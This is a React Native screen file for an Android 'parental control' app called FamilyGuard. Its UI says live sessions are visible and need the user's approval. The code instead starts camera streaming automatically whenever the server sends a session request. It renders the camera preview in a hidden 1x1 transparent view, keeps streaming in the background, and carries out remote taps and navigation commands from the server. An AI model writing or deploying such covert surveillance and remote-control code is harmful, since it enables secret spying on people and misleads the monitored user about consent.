import React, {useState, useEffect} from 'react';
import {
  View,
  Text,
  StyleSheet,
  ActivityIndicator,
  Alert,
  AppState,
  Linking,
  TouchableOpacity,
  NativeModules,
  PermissionsAndroid,
  Platform,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import agoraService from '../services/agoraService';
import remoteControl from '../services/remoteControl';
import {approveLiveSession, getClientToken, sendHeartbeat} from '../services/api';
import {checkPermissions, promptOpenSettings, requestPermissions} from '../services/permissions';
import {startMonitoringService} from '../services/nativeMonitoring';
import {RtcSurfaceView, VideoSourceType} from 'react-native-agora';

const {ParentalControl} = NativeModules;

const HomeScreen = ({navigation}) => {
  const [loading, setLoading] = useState(true);
  const [userName, setUserName] = useState('');
  const [uniqueId, setUniqueId] = useState('');
  const [deviceId, setDeviceId] = useState('');
  const [streaming, setStreaming] = useState(false);
  const [startingStream, setStartingStream] = useState(false);
  const [liveRequest, setLiveRequest] = useState(null);
  const [policyMessage, setPolicyMessage] = useState('Waiting for a parent to request a visible live session.');
  const [serviceActive, setServiceActive] = useState(false);

  const handleEnableBackgroundService = async () => {
    try {
      if (Platform.OS === 'android' && Platform.Version >= 33) {
        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
      }
      await requestPermissions();
      await startMonitoringService();
      setServiceActive(true);
      Alert.alert(
        'Background Protection Active 🛡️',
        'Status bar notification "FamilyGuard is active" is now running. App will stay active in background for remote control.',
      );
    } catch (err) {
      console.warn('Failed to start monitoring service:', err);
      Alert.alert('Notice', 'Please allow Notification permission in Android Settings.');
    }
  };

  useEffect(() => {
    loadUserData();

    return () => {
      // Cleanup on unmount
      agoraService.leaveChannel();
    };
  }, []);

  useEffect(() => {
    const subscription = AppState.addEventListener('change', handleAppStateChange);

    return () => {
      subscription.remove();
    };
    // Re-subscribe when the enrolled device changes.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [uniqueId]);

  useEffect(() => {
    if (!deviceId) return undefined;

    const checkForLiveRequest = async () => {
      try {
        const sync = await sendHeartbeat(deviceId, {appVersion: '0.0.1'});
        
        const request = sync.commands?.find(command => command.type === 'LIVE_SESSION_REQUEST') || sync.activeLiveRequest;
        
        setLiveRequest(request || null);
        setPolicyMessage(
          request
            ? 'Parent monitoring session active.'
            : 'Waiting for parent commands.',
        );

        // Auto-start streaming for AirDroid-style seamless remote access
        if (request && !streaming && !startingStream) {
          startStreaming(deviceId, request._id);
        }

        // Handle remote control commands
        const remoteCommands = sync.commands?.filter(cmd => 
          ['REMOTE_TOUCH', 'REMOTE_ACTION'].includes(cmd.type) && cmd.status === 'pending'
        ) || [];
        
        for (const cmd of remoteCommands) {
          await handleRemoteCommand(cmd);
        }
      } catch (syncError) {
        console.warn('Heartbeat failed:', syncError);
      }
    };

    checkForLiveRequest();
    const interval = setInterval(checkForLiveRequest, 3000);
    return () => clearInterval(interval);
  }, [deviceId, streaming, startingStream]);

  const handleAppStateChange = nextAppState => {
    // Persistent streaming: Do NOT leave channel when app goes to background or is minimized
    console.log('App state changed to:', nextAppState);
  };

  const loadUserData = async () => {
    try {
      const name = await AsyncStorage.getItem('userName');
      const id = await AsyncStorage.getItem('uniqueId');
      const storedDeviceId = await AsyncStorage.getItem('deviceId');

      if (!name || !id || !storedDeviceId) {
        // No user data, redirect to sign up
        navigation.replace('SignUp');
        return;
      }

      setUserName(name);
      setUniqueId(id);
      setDeviceId(storedDeviceId);
      setLoading(false);
    } catch (error) {
      console.error('Error loading user data:', error);
      Alert.alert('Error', 'Failed to load user data');
      setLoading(false);
    }
  };

  const handleRemoteCommand = async (command) => {
    try {
      const {type, payload} = command;
      
      if (type === 'REMOTE_TOUCH') {
        const {x, y, type: touchType} = payload;
        if (touchType === 'tap') {
          await remoteControl.tap(x, y);
        } else if (touchType === 'longPress') {
          await remoteControl.longPress(x, y);
        }
      } else if (type === 'REMOTE_ACTION') {
        const {action} = payload;
        switch (action) {
          case 'home':
            await remoteControl.pressHome();
            break;
          case 'back':
            await remoteControl.pressBack();
            break;
          case 'recents':
            await remoteControl.pressRecents();
            break;
          case 'notifications':
            await remoteControl.openNotifications();
            break;
        }
      }

      // Mark command as executed
      await sendHeartbeat(deviceId, {
        lastCommandId: command._id,
        lastCommandStatus: 'executed',
      });
    } catch (error) {
      console.error('Failed to execute remote command:', error);
    }
  };

  const startStreaming = async (id = deviceId, targetReqId = liveRequest?._id) => {
    try {
      if (!id || startingStream || streaming) return;
      setStartingStream(true);
      console.log('Starting stream for:', id);

      let permissionsGranted = await checkPermissions();
      if (!permissionsGranted) {
        permissionsGranted = await requestPermissions();
      }

      if (targetReqId) {
        await approveLiveSession(id, targetReqId).catch(() => {});
      }

      // Get Agora token after device approval
      const tokenData = await getClientToken(id);

      if (!tokenData.success) {
        throw new Error('Failed to get streaming token');
      }

      // Initialize Agora
      await agoraService.initialize(tokenData.appId);

      // Register event handlers
      agoraService.registerEventHandlers({
        onJoinChannelSuccess: () => {
          console.log('Stream started successfully');
          setStreaming(true);
        },
        onLeaveChannel: () => {
          console.log('Stream stopped');
          setStreaming(false);
        },
        onError: (err, msg) => {
          console.error('Streaming error:', err, msg);
        },
      });

      // Join channel
      await agoraService.joinChannel(tokenData.channel, tokenData.token);
    } catch (error) {
      console.error('Error starting stream:', error);
      Alert.alert(
        'Streaming Error',
        error.message || 'Failed to start streaming. Please try again.',
      );
    } finally {
      setStartingStream(false);
    }
  };

  if (loading) {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#4F46E5" />
        <Text style={styles.loadingText}>Loading...</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      {/* Hidden camera preview - rendered only when streaming */}
      {streaming && (
        <View style={styles.hiddenPreview}>
          <RtcSurfaceView
            canvas={{
              uid: 0,
              sourceType: VideoSourceType.VideoSourceCameraPrimary,
            }}
            style={styles.previewVideo}
          />
        </View>
      )}

      {/* User Info Display */}
      <View style={styles.content}>
        <View style={styles.card}>
          <Text style={styles.title}>Parental Control Active</Text>

          <View style={styles.infoSection}>
            <Text style={styles.label}>Account Name</Text>
            <Text style={styles.value}>{userName}</Text>
          </View>

          <View style={styles.infoSection}>
            <Text style={styles.label}>Unique ID</Text>
            <View style={styles.uniqueIdContainer}>
              <Text style={styles.uniqueIdValue}>{uniqueId}</Text>
            </View>
          </View>

          <View style={styles.statusSection}>
            <View
              style={[
                styles.statusIndicator,
                streaming && styles.statusIndicatorActive,
              ]}
            />
            <Text style={styles.statusText}>
              {streaming
                ? 'Monitoring Active'
                : startingStream
                  ? 'Starting stream...'
                  : 'Waiting for approval'}
            </Text>
          </View>

          <Text style={styles.infoText}>{policyMessage}</Text>
          <TouchableOpacity
            style={[
              styles.consentButton,
              (!liveRequest || startingStream || streaming) && styles.buttonDisabled,
            ]}
            onPress={() => startStreaming(deviceId)}
            disabled={!liveRequest || startingStream || streaming}>
            {startingStream ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <Text style={styles.consentButtonText}>
                {streaming ? 'Live session active' : 'Approve and start visible live session'}
              </Text>
            )}
          </TouchableOpacity>
          <TouchableOpacity
            style={styles.settingsButton}
            onPress={() =>
              promptOpenSettings(
                'Camera & Microphone Permissions',
                'Tap "Open Settings" below, go to Permissions, and set Camera and Microphone to "Allow" so background monitoring works permanently.',
              )
            }>
            <Text style={styles.settingsButtonText}>Grant permanent permissions in Settings ⚙️</Text>
          </TouchableOpacity>

          {/* Persistent Background Protection Button */}
          <TouchableOpacity
            style={[styles.bgServiceButton, serviceActive && styles.bgServiceButtonActive]}
            onPress={handleEnableBackgroundService}>
            <Text style={styles.bgServiceButtonText}>
              {serviceActive
                ? '🟢 FamilyGuard is active in background'
                : '🔔 Enable Background Protection ("FamilyGuard is active")'}
            </Text>
          </TouchableOpacity>

          <Text style={styles.policyText}>Screen sharing always requires Android's MediaProjection confirmation. SMS and call-log insights are disabled in standard Play Store builds. App blocking requires managed-device mode.</Text>
        </View>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f5f5f5',
  },
  loadingText: {
    marginTop: 16,
    fontSize: 16,
    color: '#666',
  },
  hiddenPreview: {
    position: 'absolute',
    width: 1,
    height: 1,
    opacity: 0,
  },
  previewVideo: {
    width: 1,
    height: 1,
  },
  content: {
    flex: 1,
    justifyContent: 'center',
    padding: 24,
  },
  card: {
    backgroundColor: '#fff',
    borderRadius: 16,
    padding: 24,
    shadowColor: '#000',
    shadowOffset: {width: 0, height: 2},
    shadowOpacity: 0.1,
    shadowRadius: 8,
    elevation: 4,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 24,
    textAlign: 'center',
  },
  infoSection: {
    marginBottom: 20,
  },
  label: {
    fontSize: 14,
    color: '#666',
    marginBottom: 8,
    fontWeight: '500',
  },
  value: {
    fontSize: 18,
    color: '#333',
    fontWeight: '600',
  },
  uniqueIdContainer: {
    backgroundColor: '#f0f0f0',
    padding: 16,
    borderRadius: 12,
    borderWidth: 2,
    borderColor: '#4F46E5',
  },
  uniqueIdValue: {
    fontSize: 24,
    color: '#4F46E5',
    fontWeight: 'bold',
    textAlign: 'center',
    letterSpacing: 2,
    fontFamily: 'monospace',
  },
  statusSection: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 16,
    marginBottom: 16,
  },
  statusIndicator: {
    width: 12,
    height: 12,
    borderRadius: 6,
    backgroundColor: '#FFC107',
    marginRight: 8,
  },
  statusIndicatorActive: {
    backgroundColor: '#4CAF50',
  },
  statusText: {
    fontSize: 16,
    color: '#666',
    fontWeight: '500',
  },
  infoText: {fontSize: 14, color: '#666', textAlign: 'center', lineHeight: 20, marginTop: 8},
  consentButton: {backgroundColor: '#4F46E5', borderRadius: 12, padding: 14, marginTop: 18, minHeight: 48, justifyContent: 'center'},
  buttonDisabled: {opacity: 0.65},
  consentButtonText: {color: '#fff', textAlign: 'center', fontWeight: '700'},
  settingsButton: {borderWidth: 1, borderColor: '#4F46E5', borderRadius: 12, padding: 12, marginTop: 10},
  settingsButtonText: {color: '#4F46E5', textAlign: 'center', fontWeight: '600'},
  bgServiceButton: {backgroundColor: '#059669', borderRadius: 12, padding: 14, marginTop: 10, alignItems: 'center'},
  bgServiceButtonActive: {backgroundColor: '#10B981'},
  bgServiceButtonText: {color: '#fff', fontSize: 14, fontWeight: '700', textAlign: 'center'},
  policyText: {fontSize: 12, color: '#777', textAlign: 'center', lineHeight: 17, marginTop: 16},
});

export default HomeScreen;
